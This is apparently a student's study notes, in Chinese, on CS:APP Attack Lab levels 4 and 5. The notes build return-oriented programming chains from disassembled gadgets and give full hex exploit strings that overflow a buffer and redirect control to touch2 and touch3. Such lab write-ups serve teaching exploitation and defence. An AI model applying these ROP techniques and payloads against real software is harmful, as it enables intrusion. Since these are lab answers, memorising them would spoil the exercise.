# level 4
> gadget farm含有一系列没那么有用的函数，按照需求，汇编对应的函数作为攻击字符串。与level2类似，要将cookie的值作为参数传入touch2函数，但不能使用栈溢出的方法。

> 我需要先写出了攻击指令序列，汇编。之后在gaget farm中找到包含攻击指令的gaget函数

''' asm 
    mov 0x59b997fa, %rdi ;但是farm中不存在这样的指令
    ; 需要保证 (%rsp)=cookie 
    pop rdi 5f
''' 
5f 3c
'''asm
  402b18:	41 5f                	pop    %r15
  402b1a:	c3                   	retq   
'''
> 因此从0x402b19开始执行可以达到效果
> 运行`call 0x402b19`？将buf的返回地址覆盖为0x402b19即可
> 在运行完pop rdi之后，rsp+8（因为rdi 64bit为8个字节），注意到rsp所指向的内存就是输入的buf字符串。因此需要将
fa 97 b9 59
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
19 2b 40 00
> 上述的攻击字符并没有进入到touch2中，只做到了跳转到pop rdi以及将cookie压入rdi
> 既然手册中说了要利用farm中的数据，那么我还得再看看
pop rax 58 
mov rax, rdi 48 89 c7
ret c3

'''asm
00000000004019a0 <addval_273>:
  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  4019a6:	c3                   	retq   
  ；这个gaget可以完成mov rax, rdi
'''

'''asm
00000000004019ca <getval_280>:
  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
  4019cf:	c3                   	retq   
  ; 90为nop，因此这个gaget可以完成pop rax
'''

> 所以先利用栈溢出的方法，将地址跳转到`0x4019cc`，之后ret到栈(rsp)所指的地址
> 这个地址就是我们输入buf的第一个字，需要跳转到`0x4019a2`
a2 19 40 00
> 有一点不对，因为已经执行了pop rax，所以rsp+8所以需要在rsp+8的位置输入
fa 97 b9 59 
00 00 00 00 
a2 19 40 00
ec 17 40 00
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
19 2b 40 00
> 原来可以输入超过40个字节！依旧可以通过覆盖地址的方法跳转到指定的位置（farm）
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
cc 19 40 00
00 00 00 00 
fa 97 b9 59 
00 00 00 00
a2 19 40 00
00 00 00 00
ec 17 40 00
!!!!!一定要记得把地址补全，因为攻击代码利用了栈溢出的原理，如果地址只写成32位的，那么有可能无法有点的获得地址，高16位有别的数据。因此一定要补0

# level 5
类似于touch3，攻击代码中要含有cookie。并将cookie在栈上的地址作为参数传递给rdi
由于采用了栈随机化的手段，因此没有办法直接定位出cookie的地址
把cookie存储在buf的最开始，这样cookie与攻击代码的相对地址是可知的，
剩下的就是需要知道当前栈rsp的位置
不存在pop rsi
因此需要mov rsp, rsi
pop rdi

00000000004019d6 <add_xy>:
  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  4019da:	c3                   	retq   
rax = rdi + rsi

adddr mov rsp, rdi 48 89 e7
(store cookie on stack first，打算把它存在32～39的位置)
(store relative assest value on stack，即将rsi置为-8 0xFFFFFFFFFFFFFFF8)
addr pop rsi
addr add_xy
addr touch3
> 因为farm中不存在mov rsp, rdi这条指令，所以更换思路
addr mov rsp, rsi 
addr pop rdi
addr add_xy
addr mov rax, rdi
addr touch3
> 也不存在mov rsp, rsi。可以利用其他寄存器做中转
0000000000401a03 <addval_190>:
  401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax
  401a09:	c3                   	retq   

其中48 89 e0代表了mov rsp, rax，更改攻击代码为
mov rsp, rax
mov rax, rdi ; 因为只存在48 89 c7
; pop rsi 不存在这条指令，需要借助中转寄存器

add_xy
touch3
> 整体思路没有问题，将mov rsp, rdi的思路也正确，但是将偏移量移动到rsi是真的很麻烦
所有的mov %reg, rsi都不存在，尝试使用mov reg, esi
mov ecx, esi 401a13
0000000000401a11 <addval_436>:
  401a11:	8d 87 89 ce 90 90    	lea    -0x6f6f3177(%rdi),%eax
  401a17:	c3                   	retq   
mov edx, ecx 401a70
0000000000401a6e <setval_167>:
  401a6e:	c7 07 89 d1 91 c3    	movl   $0xc391d189,(%rdi)
  401a74:	c3                   	retq   
mov eax, edx 4019dd
00000000004019db <getval_481>:
  4019db:	b8 5c 89 c2 90       	mov    $0x90c2895c,%eax
  4019e0:	c3                   	retq   
所以
addr pop rax
偏移量数值
addr mov eax, edx
addr mov edx, ecx
addr mov ecx, esi
> 现在解决了rsi存储偏移量的问题，开始解决mov rsp, rdi的问题
0000000000401a03 <addval_190>:
  401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax
  401a09:	c3                   	retq   

其中48 89 e0代表了mov rsp, rax，更改攻击代码为
mov rsp, rax
mov rax, rdi ; 因为只存在48 89 c7

所以
addr pop rax 4019ab
偏移量数值40 or 32?
addr mov eax, edx 4019dd
addr mov edx, ecx 401a70
addr mov ecx, esi 401a13
addr mov rsp, rax 401a06
addr mov rax, rdi 4019a2
addr add_xy 4019d6
mov rax, rdi 4019a2
addr touch3 
cookie ascii

00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
ab 19 40 00 00 00 00 00
28 00 00 00 00 00 00 00
dd 19 40 00 00 00 00 00
70 1a 40 00 00 00 00 00
13 1a 40 00 00 00 00 00
06 1a 40 00 00 00 00 00
a2 19 40 00 00 00 00 00
d6 19 40 00 00 00 00 00
a2 19 40 00 00 00 00 00
fa 18 40 00 00 00 00 00
35 39 62 39 39 37 66 61

两个疑问：
1. 为什么要+32而不是+40，rsp寄存器的位置非常关键。在这个题目里面，栈上存储的都是返回地址。想计算cookie-ascii与某一条指令的相对位移，不能通过单纯的计算两者之间有多少条指令，因为栈上存储的不是指令！而是指令的地址。题目中，计算机在执行mov rsp, reg的时候，显然是计算机在执行上一条指令结束后，ret到这里的。ret需要去`栈`上寻找指令的地址。找到这条指令之后，rsp+8，并且pc进行对应的置数。
2. 为什么要存储ascii码而不是cookie的值，ascii码的顺序为什么是按照cookie从高位->地位的顺序编码写入攻击序列。